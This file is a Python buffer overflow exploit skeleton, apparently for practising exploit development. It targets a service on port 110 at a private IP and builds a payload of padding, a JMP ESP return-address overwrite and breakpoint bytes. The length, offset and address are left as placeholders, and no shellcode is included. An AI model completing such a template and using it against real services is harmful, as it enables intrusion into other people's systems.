#!/usr/bin/python
import socket
import struct

#set up the IP and port to connect to
RHOST = "192.168.1.238" 
RPORT = 110

#set up the IP and port to connect to
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

s.recv(1024)

#build a message

buf_totlen= TOTAL LENGTH
offset_srp = OFFSET NUMBER
ptr_jmp_esp = 0xADDRESS

buf = ""
buf += "A"*(offset_srp - len(buf)) #padding
buf += struct.pack("<I",ptr_jmp_esp) #SRP overwrite using struct pack that does little endian work for me
#buf += sub_esp_10 #ESP  points here
buf += "\xCC\xCC\xCC\xCC" #ESP Poins here | this is software breakpoint
buf += "C"*(buf_totlen - len(buf)) #trailing padding
buf += "\r\n"

#send the message
s.send("VALUE " + buf)

#receive some data from socket
s.recv(1024)

s.close()
